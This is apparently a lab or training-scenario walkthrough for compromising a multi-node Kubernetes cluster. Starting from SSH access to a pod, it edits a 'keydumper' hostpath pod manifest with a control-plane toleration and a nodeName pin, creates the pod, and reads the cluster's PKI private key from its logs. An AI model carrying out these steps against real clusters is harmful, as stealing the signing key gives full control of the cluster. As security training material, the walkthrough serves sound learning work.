# SSH to Create Pod - Multi Node

### Compromising the cluster

This scenario begins with ssh access to a pod. The ssh credentials can be found in the scenario setup.

3. `kubectl get po -n kube-system` will fail (user doesn't have those rights)
4. `kubectl get po` will work and give you a list of pods in the default namespace
At this point there's several ways to achieve the goal, lets go with hostpath, however as we have a multi-node cluster, we need to make sure that our pod will land on the control plane node that has the key available.

5. There's two steps needed to modify the keydumper manifest to have this work. First, copy the `/key-dumper-pod.yml` file to `/home/sshuser/`, then add the following lines to the spec section of the manifest to allow it to schedule to a control plane node :-
```yaml
  tolerations:
  - key: node-role.kubernetes.io/master
    effect: NoSchedule
```

6. Then we need to specify the node to land on , get the nodes with `kubectl get nodes` then add the following line to the spec. section of the manifest.
```yaml
  nodeName: sshcpmn-control-plane
```


5. Now we need to create a pod that dumps out the PKI private key `kubectl create -f keydumper.yml`
6. and the key should be in the logs `kubectl logs keydumper-pod`
7. profit!
